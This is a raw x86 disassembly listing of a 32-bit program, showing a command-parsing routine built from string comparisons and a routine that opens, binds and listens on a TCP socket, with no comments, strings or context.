13143b18:	e8 05 eb ff ff       	call   0x13142622
13143b1d:	8d 85 c0 f5 ff ff    	lea    -0xa40(%ebp),%eax
13143b23:	6a 2b                	push   $0x2b
13143b25:	50                   	push   %eax
13143b26:	68 e8 d4 14 13       	push   $0x1314d4e8
13143b2b:	e8 4d 21 00 00       	call   0x13145c7d
13143b30:	56                   	push   %esi
13143b31:	8d 85 00 ff ff ff    	lea    -0x100(%ebp),%eax
13143b37:	68 f8 f1 14 13       	push   $0x1314f1f8
13143b3c:	50                   	push   %eax
13143b3d:	e8 4f eb ff ff       	call   0x13142691
13143b42:	83 c4 30             	add    $0x30,%esp
13143b45:	85 c0                	test   %eax,%eax
13143b47:	75 6e                	jne    0x13143bb7
13143b49:	39 9d 40 f6 ff ff    	cmp    %ebx,-0x9c0(%ebp)
13143b4f:	74 0a                	je     0x13143b5b
13143b51:	68 e0 f1 14 13       	push   $0x1314f1e0
13143b56:	e9 e5 05 00 00       	jmp    0x13144140
13143b5b:	8d 85 c0 f5 ff ff    	lea    -0xa40(%ebp),%eax
13143b61:	50                   	push   %eax
13143b62:	8d 85 05 ff ff ff    	lea    -0xfb(%ebp),%eax
13143b68:	50                   	push   %eax
13143b69:	e8 be eb ff ff       	call   0x1314272c
13143b6e:	59                   	pop    %ecx
13143b6f:	85 c0                	test   %eax,%eax
13143b71:	59                   	pop    %ecx
13143b72:	75 1b                	jne    0x13143b8f
13143b74:	8d 85 05 ff ff ff    	lea    -0xfb(%ebp),%eax
13143b7a:	c7 85 40 f6 ff ff 01 	movl   $0x1,-0x9c0(%ebp)
13143b81:	00 00 00 
13143b84:	50                   	push   %eax
13143b85:	68 c8 f1 14 13       	push   $0x1314f1c8
13143b8a:	e9 dc 05 00 00       	jmp    0x1314416b
13143b8f:	8d 85 00 fe ff ff    	lea    -0x200(%ebp),%eax
13143b95:	68 b0 f1 14 13       	push   $0x1314f1b0
13143b9a:	50                   	push   %eax
13143b9b:	ff 15 98 39 15 13    	call   *0x13153998
13143ba1:	59                   	pop    %ecx
13143ba2:	59                   	pop    %ecx
13143ba3:	6a 01                	push   $0x1
13143ba5:	58                   	pop    %eax
13143ba6:	89 85 40 f6 ff ff    	mov    %eax,-0x9c0(%ebp)
13143bac:	89 85 4c f6 ff ff    	mov    %eax,-0x9b4(%ebp)
13143bb2:	e9 c4 05 00 00       	jmp    0x1314417b
13143bb7:	6a 04                	push   $0x4
13143bb9:	8d 85 00 ff ff ff    	lea    -0x100(%ebp),%eax
13143bbf:	68 a8 f1 14 13       	push   $0x1314f1a8
13143bc4:	50                   	push   %eax
13143bc5:	e8 c7 ea ff ff       	call   0x13142691
13143bca:	83 c4 0c             	add    $0xc,%esp
13143bcd:	85 c0                	test   %eax,%eax
13143bcf:	75 23                	jne    0x13143bf4
13143bd1:	8d 85 00 fe ff ff    	lea    -0x200(%ebp),%eax
13143bd7:	68 98 f1 14 13       	push   $0x1314f198
13143bdc:	50                   	push   %eax
13143bdd:	ff 15 98 39 15 13    	call   *0x13153998
13143be3:	59                   	pop    %ecx
13143be4:	c7 85 4c f6 ff ff 01 	movl   $0x1,-0x9b4(%ebp)
13143beb:	00 00 00 
13143bee:	59                   	pop    %ecx
13143bef:	e9 87 05 00 00       	jmp    0x1314417b
13143bf4:	39 9d 40 f6 ff ff    	cmp    %ebx,-0x9c0(%ebp)
13143bfa:	75 0a                	jne    0x13143c06
13143bfc:	68 70 f1 14 13       	push   $0x1314f170
13143c01:	e9 3a 05 00 00       	jmp    0x13144140
13143c06:	56                   	push   %esi
13143c07:	8d 85 00 ff ff ff    	lea    -0x100(%ebp),%eax
13143c0d:	68 68 f1 14 13       	push   $0x1314f168
13143c12:	50                   	push   %eax
13143c13:	e8 79 ea ff ff       	call   0x13142691
13143c18:	83 c4 0c             	add    $0xc,%esp
13143c1b:	85 c0                	test   %eax,%eax
13143c1d:	75 4b                	jne    0x13143c6a
13143c1f:	8a 85 05 ff ff ff    	mov    -0xfb(%ebp),%al
13143c25:	3a c3                	cmp    %bl,%al
13143c27:	74 41                	je     0x13143c6a
13143c29:	3c 49                	cmp    $0x49,%al
13143c2b:	88 85 44 f6 ff ff    	mov    %al,-0x9bc(%ebp)
13143c31:	74 29                	je     0x13143c5c
13143c33:	3c 41                	cmp    $0x41,%al
13143c35:	74 25                	je     0x13143c5c
13143c37:	0f be c0             	movsbl %al,%eax
13143c3a:	50                   	push   %eax
13143c3b:	8d 85 00 fe ff ff    	lea    -0x200(%ebp),%eax
13143c41:	68 50 f1 14 13       	push   $0x1314f150
13143c46:	50                   	push   %eax
13143c47:	ff 15 98 39 15 13    	call   *0x13153998
13143c4d:	83 c4 0c             	add    $0xc,%esp
13143c50:	c6 85 44 f6 ff ff 49 	movb   $0x49,-0x9bc(%ebp)
13143c57:	e9 1f 05 00 00       	jmp    0x1314417b
13143c5c:	0f be c0             	movsbl %al,%eax
13143c5f:	50                   	push   %eax
13143c60:	68 38 f1 14 13       	push   $0x1314f138
13143c65:	e9 01 05 00 00       	jmp    0x1314416b
13143c6a:	6a 03                	push   $0x3
13143c6c:	8d 85 00 ff ff ff    	lea    -0x100(%ebp),%eax
13143c72:	68 34 f1 14 13       	push   $0x1314f134
13143c77:	50                   	push   %eax
13143c78:	e8 14 ea ff ff       	call   0x13142691
13143c7d:	83 c4 0c             	add    $0xc,%esp
13143c80:	85 c0                	test   %eax,%eax
13143c82:	0f 84 d7 04 00 00    	je     0x1314415f
13143c88:	6a 04                	push   $0x4
13143c8a:	8d 85 00 ff ff ff    	lea    -0x100(%ebp),%eax
13143c90:	68 2c f1 14 13       	push   $0x1314f12c
13143c95:	50                   	push   %eax
13143c96:	e8 f6 e9 ff ff       	call   0x13142691
13143c9b:	83 c4 0c             	add    $0xc,%esp
13143c9e:	85 c0                	test   %eax,%eax
13143ca0:	0f 84 b9 04 00 00    	je     0x1314415f
13143ca6:	6a 04                	push   $0x4
13143ca8:	8d 85 00 ff ff ff    	lea    -0x100(%ebp),%eax
13143cae:	68 24 f1 14 13       	push   $0x1314f124
13143cb3:	50                   	push   %eax
13143cb4:	e8 d8 e9 ff ff       	call   0x13142691
13143cb9:	83 c4 0c             	add    $0xc,%esp
13143cbc:	85 c0                	test   %eax,%eax
13143cbe:	75 0a                	jne    0x13143cca
13143cc0:	68 00 f1 14 13       	push   $0x1314f100
13143cc5:	e9 76 04 00 00       	jmp    0x13144140
13143cca:	56                   	push   %esi
13143ccb:	8d 85 00 ff ff ff    	lea    -0x100(%ebp),%eax
13143cd1:	68 f8 f0 14 13       	push   $0x1314f0f8
13143cd6:	50                   	push   %eax
13143cd7:	e8 b5 e9 ff ff       	call   0x13142691
13143cdc:	83 c4 0c             	add    $0xc,%esp
13143cdf:	85 c0                	test   %eax,%eax
13143ce1:	0f 85 ee 00 00 00    	jne    0x13143dd5
13143ce7:	8d 85 40 f6 ff ff    	lea    -0x9c0(%ebp),%eax
13143ced:	50                   	push   %eax
13143cee:	e8 97 f0 ff ff       	call   0x13142d8a
13143cf3:	8d 85 00 ff ff ff    	lea    -0x100(%ebp),%eax
13143cf9:	50                   	push   %eax
13143cfa:	e8 fe e9 ff ff       	call   0x131426fd
13143cff:	59                   	pop    %ecx
13143d00:	83 f8 1c             	cmp    $0x1c,%eax
13143d03:	59                   	pop    %ecx
13143d04:	0f 8f b3 00 00 00    	jg     0x13143dbd
13143d0a:	8d 85 de fd ff ff    	lea    -0x222(%ebp),%eax
13143d10:	50                   	push   %eax
13143d11:	8d 85 c2 fd ff ff    	lea    -0x23e(%ebp),%eax
13143d17:	50                   	push   %eax
13143d18:	8d 85 a6 fd ff ff    	lea    -0x25a(%ebp),%eax
13143d1e:	50                   	push   %eax
13143d1f:	8d 85 8a fd ff ff    	lea    -0x276(%ebp),%eax
13143d25:	50                   	push   %eax
13143d26:	8d 85 6e fd ff ff    	lea    -0x292(%ebp),%eax
13143d2c:	50                   	push   %eax
13143d2d:	8d 85 52 fd ff ff    	lea    -0x2ae(%ebp),%eax
13143d33:	50                   	push   %eax
13143d34:	8d 85 00 ff ff ff    	lea    -0x100(%ebp),%eax
13143d3a:	50                   	push   %eax
13143d3b:	e8 c9 fb ff ff       	call   0x13143909
13143d40:	83 c4 1c             	add    $0x1c,%esp
13143d43:	85 c0                	test   %eax,%eax
13143d45:	74 76                	je     0x13143dbd
13143d47:	8d 85 52 fd ff ff    	lea    -0x2ae(%ebp),%eax
13143d4d:	50                   	push   %eax
13143d4e:	e8 aa e9 ff ff       	call   0x131426fd
13143d53:	83 f8 03             	cmp    $0x3,%eax
13143d56:	59                   	pop    %ecx
13143d57:	7f 64                	jg     0x13143dbd
13143d59:	8d 85 6e fd ff ff    	lea    -0x292(%ebp),%eax
13143d5f:	50                   	push   %eax
13143d60:	e8 98 e9 ff ff       	call   0x131426fd
13143d65:	83 f8 03             	cmp    $0x3,%eax
13143d68:	59                   	pop    %ecx
13143d69:	7f 52                	jg     0x13143dbd
13143d6b:	8d 85 8a fd ff ff    	lea    -0x276(%ebp),%eax
13143d71:	50                   	push   %eax
13143d72:	e8 86 e9 ff ff       	call   0x131426fd
13143d77:	83 f8 03             	cmp    $0x3,%eax
13143d7a:	59                   	pop    %ecx
13143d7b:	7f 40                	jg     0x13143dbd
13143d7d:	8d 85 a6 fd ff ff    	lea    -0x25a(%ebp),%eax
13143d83:	50                   	push   %eax
13143d84:	e8 74 e9 ff ff       	call   0x131426fd
13143d89:	83 f8 03             	cmp    $0x3,%eax
13143d8c:	59                   	pop    %ecx
13143d8d:	7f 2e                	jg     0x13143dbd
13143d8f:	8d 85 c2 fd ff ff    	lea    -0x23e(%ebp),%eax
13143d95:	50                   	push   %eax
13143d96:	e8 62 e9 ff ff       	call   0x131426fd
13143d9b:	83 f8 03             	cmp    $0x3,%eax
13143d9e:	59                   	pop    %ecx
13143d9f:	7f 1c                	jg     0x13143dbd
13143da1:	8d 85 de fd ff ff    	lea    -0x222(%ebp),%eax
13143da7:	50                   	push   %eax
13143da8:	e8 50 e9 ff ff       	call   0x131426fd
13143dad:	83 f8 03             	cmp    $0x3,%eax
13143db0:	59                   	pop    %ecx
13143db1:	7f 0a                	jg     0x13143dbd
13143db3:	68 d8 f0 14 13       	push   $0x1314f0d8
13143db8:	e9 83 03 00 00       	jmp    0x13144140
13143dbd:	8d 85 40 f6 ff ff    	lea    -0x9c0(%ebp),%eax
13143dc3:	50                   	push   %eax
13143dc4:	e8 c1 ef ff ff       	call   0x13142d8a
13143dc9:	c7 04 24 bc f0 14 13 	movl   $0x1314f0bc,(%esp)
13143dd0:	e9 6b 03 00 00       	jmp    0x13144140
13143dd5:	6a 04                	push   $0x4
13143dd7:	8d 85 00 ff ff ff    	lea    -0x100(%ebp),%eax
13143ddd:	68 b4 f0 14 13       	push   $0x1314f0b4
13143de2:	50                   	push   %eax
13143de3:	e8 a9 e8 ff ff       	call   0x13142691
13143de8:	83 c4 0c             	add    $0xc,%esp
13143deb:	85 c0                	test   %eax,%eax
13143ded:	75 11                	jne    0x13143e00
13143def:	8d 85 40 f6 ff ff    	lea    -0x9c0(%ebp),%eax
13143df5:	50                   	push   %eax
13143df6:	e8 58 f7 ff ff       	call   0x13143553
13143dfb:	e9 4e 03 00 00       	jmp    0x1314414e
13143e00:	6a 04                	push   $0x4
13143e02:	8d 85 00 ff ff ff    	lea    -0x100(%ebp),%eax
13143e08:	68 ac f0 14 13       	push   $0x1314f0ac
13143e0d:	50                   	push   %eax
13143e0e:	e8 7e e8 ff ff       	call   0x13142691
13143e13:	83 c4 0c             	add    $0xc,%esp
13143e16:	85 c0                	test   %eax,%eax
13143e18:	75 2e                	jne    0x13143e48
13143e1a:	38 9d 04 ff ff ff    	cmp    %bl,-0xfc(%ebp)
13143e20:	74 26                	je     0x13143e48
13143e22:	8d 85 40 f6 ff ff    	lea    -0x9c0(%ebp),%eax
13143e28:	50                   	push   %eax
13143e29:	8d 85 04 ff ff ff    	lea    -0xfc(%ebp),%eax
13143e2f:	50                   	push   %eax
13143e30:	e8 5c f0 ff ff       	call   0x13142e91
13143e35:	59                   	pop    %ecx
13143e36:	85 c0                	test   %eax,%eax
13143e38:	59                   	pop    %ecx
13143e39:	0f 84 6c 02 00 00    	je     0x131440ab
13143e3f:	8d 85 52 f9 ff ff    	lea    -0x6ae(%ebp),%eax
13143e45:	50                   	push   %eax
13143e46:	eb 38                	jmp    0x13143e80
13143e48:	6a 04                	push   $0x4
13143e4a:	8d 85 00 ff ff ff    	lea    -0x100(%ebp),%eax
13143e50:	68 a4 f0 14 13       	push   $0x1314f0a4
13143e55:	50                   	push   %eax
13143e56:	e8 36 e8 ff ff       	call   0x13142691
13143e5b:	83 c4 0c             	add    $0xc,%esp
13143e5e:	85 c0                	test   %eax,%eax
13143e60:	75 2e                	jne    0x13143e90
13143e62:	8d 85 40 f6 ff ff    	lea    -0x9c0(%ebp),%eax
13143e68:	50                   	push   %eax
13143e69:	68 a0 f0 14 13       	push   $0x1314f0a0
13143e6e:	e8 1e f0 ff ff       	call   0x13142e91
13143e73:	59                   	pop    %ecx
13143e74:	85 c0                	test   %eax,%eax
13143e76:	59                   	pop    %ecx
13143e77:	8d 85 52 f9 ff ff    	lea    -0x6ae(%ebp),%eax
13143e7d:	50                   	push   %eax
13143e7e:	74 0a                	je     0x13143e8a
13143e80:	68 80 f0 14 13       	push   $0x1314f080
13143e85:	e9 e1 02 00 00       	jmp    0x1314416b
13143e8a:	57                   	push   %edi
13143e8b:	e9 db 02 00 00       	jmp    0x1314416b
13143e90:	6a 04                	push   $0x4
13143e92:	8d 85 00 ff ff ff    	lea    -0x100(%ebp),%eax
13143e98:	68 78 f0 14 13       	push   $0x1314f078
13143e9d:	50                   	push   %eax
13143e9e:	e8 ee e7 ff ff       	call   0x13142691
13143ea3:	83 c4 0c             	add    $0xc,%esp
13143ea6:	85 c0                	test   %eax,%eax
13143ea8:	75 0a                	jne    0x13143eb4
13143eaa:	68 64 f0 14 13       	push   $0x1314f064
13143eaf:	e9 8c 02 00 00       	jmp    0x13144140
13143eb4:	56                   	push   %esi
13143eb5:	8d 85 00 ff ff ff    	lea    -0x100(%ebp),%eax
13143ebb:	68 5c f0 14 13       	push   $0x1314f05c
13143ec0:	50                   	push   %eax
13143ec1:	e8 cb e7 ff ff       	call   0x13142691
13143ec6:	83 c4 0c             	add    $0xc,%esp
13143ec9:	85 c0                	test   %eax,%eax
13143ecb:	75 2d                	jne    0x13143efa
13143ecd:	8d 85 05 ff ff ff    	lea    -0xfb(%ebp),%eax
13143ed3:	50                   	push   %eax
13143ed4:	e8 2f e9 ff ff       	call   0x13142808
13143ed9:	50                   	push   %eax
13143eda:	89 85 50 f7 ff ff    	mov    %eax,-0x8b0(%ebp)
13143ee0:	68 2c f0 14 13       	push   $0x1314f02c
13143ee5:	8d 85 00 fe ff ff    	lea    -0x200(%ebp),%eax
13143eeb:	50                   	push   %eax
13143eec:	ff 15 98 39 15 13    	call   *0x13153998
13143ef2:	83 c4 10             	add    $0x10,%esp
13143ef5:	e9 81 02 00 00       	jmp    0x1314417b
13143efa:	6a 04                	push   $0x4
13143efc:	8d 85 00 ff ff ff    	lea    -0x100(%ebp),%eax
13143f02:	68 24 f0 14 13       	push   $0x1314f024
13143f07:	50                   	push   %eax
13143f08:	e8 84 e7 ff ff       	call   0x13142691
13143f0d:	83 c4 0c             	add    $0xc,%esp
13143f10:	85 c0                	test   %eax,%eax
13143f12:	75 54                	jne    0x13143f68
13143f14:	8d 85 04 ff ff ff    	lea    -0xfc(%ebp),%eax
13143f1a:	50                   	push   %eax
13143f1b:	8d 85 50 f6 ff ff    	lea    -0x9b0(%ebp),%eax
13143f21:	68 00 d1 14 13       	push   $0x1314d100
13143f26:	50                   	push   %eax
13143f27:	ff 15 98 39 15 13    	call   *0x13153998
13143f2d:	83 c4 0c             	add    $0xc,%esp
13143f30:	38 9d 50 f6 ff ff    	cmp    %bl,-0x9b0(%ebp)
13143f36:	0f 84 6f 01 00 00    	je     0x131440ab
13143f3c:	8d 85 40 f6 ff ff    	lea    -0x9c0(%ebp),%eax
13143f42:	50                   	push   %eax
13143f43:	e8 6f f0 ff ff       	call   0x13142fb7
13143f48:	85 c0                	test   %eax,%eax
13143f4a:	59                   	pop    %ecx
13143f4b:	8d 85 50 f6 ff ff    	lea    -0x9b0(%ebp),%eax
13143f51:	50                   	push   %eax
13143f52:	75 0a                	jne    0x13143f5e
13143f54:	68 04 f0 14 13       	push   $0x1314f004
13143f59:	e9 0d 02 00 00       	jmp    0x1314416b
13143f5e:	68 e4 ef 14 13       	push   $0x1314efe4
13143f63:	e9 03 02 00 00       	jmp    0x1314416b
13143f68:	56                   	push   %esi
13143f69:	8d 85 00 ff ff ff    	lea    -0x100(%ebp),%eax
13143f6f:	68 dc ef 14 13       	push   $0x1314efdc
13143f74:	50                   	push   %eax
13143f75:	e8 17 e7 ff ff       	call   0x13142691
13143f7a:	83 c4 0c             	add    $0xc,%esp
13143f7d:	85 c0                	test   %eax,%eax
13143f7f:	75 33                	jne    0x13143fb4
13143f81:	8d 85 05 ff ff ff    	lea    -0xfb(%ebp),%eax
13143f87:	50                   	push   %eax
13143f88:	8d 85 54 f7 ff ff    	lea    -0x8ac(%ebp),%eax
13143f8e:	50                   	push   %eax
13143f8f:	ff 15 98 39 15 13    	call   *0x13153998
13143f95:	38 9d 54 f7 ff ff    	cmp    %bl,-0x8ac(%ebp)
13143f9b:	59                   	pop    %ecx
13143f9c:	59                   	pop    %ecx
13143f9d:	0f 84 08 01 00 00    	je     0x131440ab
13143fa3:	8d 85 40 f6 ff ff    	lea    -0x9c0(%ebp),%eax
13143fa9:	50                   	push   %eax
13143faa:	e8 ea f0 ff ff       	call   0x13143099
13143faf:	e9 9a 01 00 00       	jmp    0x1314414e
13143fb4:	56                   	push   %esi
13143fb5:	8d 85 00 ff ff ff    	lea    -0x100(%ebp),%eax
13143fbb:	68 d4 ef 14 13       	push   $0x1314efd4
13143fc0:	50                   	push   %eax
13143fc1:	e8 cb e6 ff ff       	call   0x13142691
13143fc6:	83 c4 0c             	add    $0xc,%esp
13143fc9:	85 c0                	test   %eax,%eax
13143fcb:	75 33                	jne    0x13144000
13143fcd:	8d 85 05 ff ff ff    	lea    -0xfb(%ebp),%eax
13143fd3:	50                   	push   %eax
13143fd4:	8d 85 54 f7 ff ff    	lea    -0x8ac(%ebp),%eax
13143fda:	50                   	push   %eax
13143fdb:	ff 15 98 39 15 13    	call   *0x13153998
13143fe1:	38 9d 54 f7 ff ff    	cmp    %bl,-0x8ac(%ebp)
13143fe7:	59                   	pop    %ecx
13143fe8:	59                   	pop    %ecx
13143fe9:	0f 84 bc 00 00 00    	je     0x131440ab
13143fef:	8d 85 40 f6 ff ff    	lea    -0x9c0(%ebp),%eax
13143ff5:	50                   	push   %eax
13143ff6:	e8 fd f2 ff ff       	call   0x131432f8
13143ffb:	e9 4e 01 00 00       	jmp    0x1314414e
13144000:	56                   	push   %esi
13144001:	8d 85 00 ff ff ff    	lea    -0x100(%ebp),%eax
13144007:	68 cc ef 14 13       	push   $0x1314efcc
1314400c:	50                   	push   %eax
1314400d:	e8 7f e6 ff ff       	call   0x13142691
13144012:	83 c4 0c             	add    $0xc,%esp
13144015:	85 c0                	test   %eax,%eax
13144017:	75 39                	jne    0x13144052
13144019:	8d 85 05 ff ff ff    	lea    -0xfb(%ebp),%eax
1314401f:	50                   	push   %eax
13144020:	8d 85 54 f7 ff ff    	lea    -0x8ac(%ebp),%eax
13144026:	50                   	push   %eax
13144027:	ff 15 98 39 15 13    	call   *0x13153998
1314402d:	38 9d 54 f7 ff ff    	cmp    %bl,-0x8ac(%ebp)
13144033:	59                   	pop    %ecx
13144034:	59                   	pop    %ecx
13144035:	74 74                	je     0x131440ab
13144037:	8d 85 40 f6 ff ff    	lea    -0x9c0(%ebp),%eax
1314403d:	50                   	push   %eax
1314403e:	e8 1d ef ff ff       	call   0x13142f60
13144043:	85 c0                	test   %eax,%eax
13144045:	59                   	pop    %ecx
13144046:	74 63                	je     0x131440ab
13144048:	68 ac ef 14 13       	push   $0x1314efac
1314404d:	e9 ee 00 00 00       	jmp    0x13144140
13144052:	6a 04                	push   $0x4
13144054:	8d 85 00 ff ff ff    	lea    -0x100(%ebp),%eax
1314405a:	68 a4 ef 14 13       	push   $0x1314efa4
1314405f:	50                   	push   %eax
13144060:	e8 2c e6 ff ff       	call   0x13142691
13144065:	83 c4 0c             	add    $0xc,%esp
13144068:	85 c0                	test   %eax,%eax
1314406a:	75 45                	jne    0x131440b1
1314406c:	38 9d 04 ff ff ff    	cmp    %bl,-0xfc(%ebp)
13144072:	74 3d                	je     0x131440b1
13144074:	8d 85 04 ff ff ff    	lea    -0xfc(%ebp),%eax
1314407a:	50                   	push   %eax
1314407b:	8d 85 54 f7 ff ff    	lea    -0x8ac(%ebp),%eax
13144081:	68 00 d1 14 13       	push   $0x1314d100
13144086:	50                   	push   %eax
13144087:	ff 15 98 39 15 13    	call   *0x13153998
1314408d:	83 c4 0c             	add    $0xc,%esp
13144090:	8d 85 54 f7 ff ff    	lea    -0x8ac(%ebp),%eax
13144096:	50                   	push   %eax
13144097:	ff 15 44 37 15 13    	call   *0x13153744
1314409d:	85 c0                	test   %eax,%eax
1314409f:	74 0a                	je     0x131440ab
131440a1:	68 84 ef 14 13       	push   $0x1314ef84
131440a6:	e9 95 00 00 00       	jmp    0x13144140
131440ab:	57                   	push   %edi
131440ac:	e9 8f 00 00 00       	jmp    0x13144140
131440b1:	6a 04                	push   $0x4
131440b3:	8d 85 00 ff ff ff    	lea    -0x100(%ebp),%eax
131440b9:	68 7c ef 14 13       	push   $0x1314ef7c
131440be:	50                   	push   %eax
131440bf:	e8 cd e5 ff ff       	call   0x13142691
131440c4:	83 c4 0c             	add    $0xc,%esp
131440c7:	85 c0                	test   %eax,%eax
131440c9:	75 07                	jne    0x131440d2
131440cb:	68 5c ef 14 13       	push   $0x1314ef5c
131440d0:	eb 6e                	jmp    0x13144140
131440d2:	56                   	push   %esi
131440d3:	8d 85 00 ff ff ff    	lea    -0x100(%ebp),%eax
131440d9:	68 54 ef 14 13       	push   $0x1314ef54
131440de:	50                   	push   %eax
131440df:	e8 ad e5 ff ff       	call   0x13142691
131440e4:	83 c4 0c             	add    $0xc,%esp
131440e7:	85 c0                	test   %eax,%eax
131440e9:	75 1e                	jne    0x13144109
131440eb:	8d 85 05 ff ff ff    	lea    -0xfb(%ebp),%eax
131440f1:	50                   	push   %eax
131440f2:	8d 85 53 f8 ff ff    	lea    -0x7ad(%ebp),%eax
131440f8:	50                   	push   %eax
131440f9:	ff 15 98 39 15 13    	call   *0x13153998
131440ff:	68 34 ef 14 13       	push   $0x1314ef34
13144104:	e9 dc fd ff ff       	jmp    0x13143ee5
13144109:	56                   	push   %esi
1314410a:	8d 85 00 ff ff ff    	lea    -0x100(%ebp),%eax
13144110:	68 2c ef 14 13       	push   $0x1314ef2c
13144115:	50                   	push   %eax
13144116:	e8 76 e5 ff ff       	call   0x13142691
1314411b:	83 c4 0c             	add    $0xc,%esp
1314411e:	85 c0                	test   %eax,%eax
13144120:	75 36                	jne    0x13144158
13144122:	8d 85 05 ff ff ff    	lea    -0xfb(%ebp),%eax
13144128:	50                   	push   %eax
13144129:	8d 85 40 f6 ff ff    	lea    -0x9c0(%ebp),%eax
1314412f:	50                   	push   %eax
13144130:	e8 d8 ee ff ff       	call   0x1314300d
13144135:	59                   	pop    %ecx
13144136:	85 c0                	test   %eax,%eax
13144138:	59                   	pop    %ecx
13144139:	75 16                	jne    0x13144151
1314413b:	68 0c ef 14 13       	push   $0x1314ef0c
13144140:	8d 85 00 fe ff ff    	lea    -0x200(%ebp),%eax
13144146:	50                   	push   %eax
13144147:	ff 15 98 39 15 13    	call   *0x13153998
1314414d:	59                   	pop    %ecx
1314414e:	59                   	pop    %ecx
1314414f:	eb 2a                	jmp    0x1314417b
13144151:	68 f8 ee 14 13       	push   $0x1314eef8
13144156:	eb e8                	jmp    0x13144140
13144158:	68 d8 ee 14 13       	push   $0x1314eed8
1314415d:	eb e1                	jmp    0x13144140
1314415f:	8d 85 52 f9 ff ff    	lea    -0x6ae(%ebp),%eax
13144165:	50                   	push   %eax
13144166:	68 b8 ee 14 13       	push   $0x1314eeb8
1314416b:	8d 85 00 fe ff ff    	lea    -0x200(%ebp),%eax
13144171:	50                   	push   %eax
13144172:	ff 15 98 39 15 13    	call   *0x13153998
13144178:	83 c4 0c             	add    $0xc,%esp
1314417b:	8d 85 00 fe ff ff    	lea    -0x200(%ebp),%eax
13144181:	53                   	push   %ebx
13144182:	50                   	push   %eax
13144183:	e8 75 e5 ff ff       	call   0x131426fd
13144188:	59                   	pop    %ecx
13144189:	50                   	push   %eax
1314418a:	8d 85 00 fe ff ff    	lea    -0x200(%ebp),%eax
13144190:	50                   	push   %eax
13144191:	ff b5 fc fd ff ff    	pushl  -0x204(%ebp)
13144197:	ff 15 68 37 15 13    	call   *0x13153768
1314419d:	39 9d 4c f6 ff ff    	cmp    %ebx,-0x9b4(%ebp)
131441a3:	75 0c                	jne    0x131441b1
131441a5:	39 1d 28 2c 15 13    	cmp    %ebx,0x13152c28
131441ab:	0f 85 c7 f8 ff ff    	jne    0x13143a78
131441b1:	ff b5 fc fd ff ff    	pushl  -0x204(%ebp)
131441b7:	ff 15 e4 36 15 13    	call   *0x131536e4
131441bd:	6a 01                	push   $0x1
131441bf:	89 1d 2c 2c 15 13    	mov    %ebx,0x13152c2c
131441c5:	58                   	pop    %eax
131441c6:	eb 14                	jmp    0x131441dc
131441c8:	ff b5 fc fd ff ff    	pushl  -0x204(%ebp)
131441ce:	89 1d 2c 2c 15 13    	mov    %ebx,0x13152c2c
131441d4:	ff 15 e4 36 15 13    	call   *0x131536e4
131441da:	33 c0                	xor    %eax,%eax
131441dc:	5f                   	pop    %edi
131441dd:	5e                   	pop    %esi
131441de:	5b                   	pop    %ebx
131441df:	c9                   	leave  
131441e0:	c2 04 00             	ret    $0x4
131441e3:	55                   	push   %ebp
131441e4:	8b ec                	mov    %esp,%ebp
131441e6:	81 ec 18 06 00 00    	sub    $0x618,%esp
131441ec:	53                   	push   %ebx
131441ed:	56                   	push   %esi
131441ee:	8b 35 24 2c 15 13    	mov    0x13152c24,%esi
131441f4:	57                   	push   %edi
131441f5:	68 34 2c 15 13       	push   $0x13152c34
131441fa:	8d 85 e8 fa ff ff    	lea    -0x518(%ebp),%eax
13144200:	68 00 d1 14 13       	push   $0x1314d100
13144205:	50                   	push   %eax
13144206:	ff 15 98 39 15 13    	call   *0x13153998
1314420c:	33 db                	xor    %ebx,%ebx
1314420e:	83 c4 0c             	add    $0xc,%esp
13144211:	39 1d 28 2c 15 13    	cmp    %ebx,0x13152c28
13144217:	75 07                	jne    0x13144220
13144219:	6a 02                	push   $0x2
1314421b:	e9 99 01 00 00       	jmp    0x131443b9
13144220:	6a 06                	push   $0x6
13144222:	6a 01                	push   $0x1
13144224:	5f                   	pop    %edi
13144225:	57                   	push   %edi
13144226:	6a 02                	push   $0x2
13144228:	ff 15 64 35 15 13    	call   *0x13153564
1314422e:	83 f8 ff             	cmp    $0xffffffff,%eax
13144231:	a3 20 2c 15 13       	mov    %eax,0x13152c20
13144236:	75 0d                	jne    0x13144245
13144238:	89 1d 28 2c 15 13    	mov    %ebx,0x13152c28
1314423e:	68 78 f2 14 13       	push   $0x1314f278
13144243:	eb 71                	jmp    0x131442b6
13144245:	56                   	push   %esi
13144246:	66 c7 45 ec 02 00    	movw   $0x2,-0x14(%ebp)
1314424c:	ff 15 8c 37 15 13    	call   *0x1315378c
13144252:	66 89 45 ee          	mov    %ax,-0x12(%ebp)
13144256:	8d 45 ec             	lea    -0x14(%ebp),%eax
13144259:	6a 10                	push   $0x10
1314425b:	50                   	push   %eax
1314425c:	ff 35 20 2c 15 13    	pushl  0x13152c20
13144262:	89 5d f0             	mov    %ebx,-0x10(%ebp)
13144265:	ff 15 5c 37 15 13    	call   *0x1315375c
1314426b:	83 f8 ff             	cmp    $0xffffffff,%eax
1314426e:	75 19                	jne    0x13144289
13144270:	ff 35 20 2c 15 13    	pushl  0x13152c20
13144276:	89 1d 28 2c 15 13    	mov    %ebx,0x13152c28
1314427c:	ff 15 e4 36 15 13    	call   *0x131536e4
13144282:	68 50 f2 14 13       	push   $0x1314f250
13144287:	eb 2d                	jmp    0x131442b6
13144289:	68 ff 00 00 00       	push   $0xff
1314428e:	ff 35 20 2c 15 13    	pushl  0x13152c20
13144294:	ff 15 00 34 15 13    	call   *0x13153400
1314429a:	83 f8 ff             	cmp    $0xffffffff,%eax
1314429d:	75 5b                	jne    0x131442fa
1314429f:	ff 35 20 2c 15 13    	pushl  0x13152c20
131442a5:	89 1d 28 2c 15 13    	mov    %ebx,0x13152c28
131442ab:	ff 15 e4 36 15 13    	call   *0x131536e4
131442b1:	68 28 f2 14 13       	push   $0x1314f228
131442b6:	8d 85 e8 fb ff ff    	lea    -0x418(%ebp),%eax
131442bc:	50                   	push   %eax
131442bd:	ff 15 98 39 15 13    	call   *0x13153998
131442c3:	39 1d 34 2d 15 13    	cmp    %ebx,0x13152d34
131442c9:	59                   	pop    %ecx
131442ca:	59                   	pop    %ecx
131442cb:	75 26                	jne    0x131442f3
131442cd:	ff 35 38 2d 15 13    	pushl  0x13152d38
131442d3:	b9 81 01 00 00       	mov    $0x181,%ecx
131442d8:	8d b5 e8 f9 ff ff    	lea    -0x618(%ebp),%esi
131442de:	81 ec 04 06 00 00    	sub    $0x604,%esp
131442e4:	8b fc                	mov    %esp,%edi
131442e6:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
131442e8:	e8 ff 47 00 00       	call   0x13148aec
